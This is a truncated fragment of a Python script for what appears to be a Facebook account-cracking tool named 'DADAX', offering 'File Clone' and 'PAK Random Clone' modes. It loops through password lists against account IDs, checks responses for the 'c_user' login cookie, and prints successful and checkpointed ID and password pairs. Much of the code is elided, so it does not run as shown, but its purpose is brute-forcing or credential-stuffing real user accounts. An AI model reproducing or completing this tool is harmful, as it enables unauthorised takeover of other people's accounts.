...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> DADAX  VERSION :\x1b[1;92m 1.1 ')
			linex()
			print('[1]  File Clone\n[2] PAK Random Clone\n[0] Exit')
			linex()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SILENT+AWAIS:
				print('\r\r\033[1;31m[DADAX-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[DADAX-CP] '+ids+' | '+pas+'\033[1;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SILENT+AWAIS:
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[DADAX-OK] '+ids+' | '+pas+'\033[1;97m')
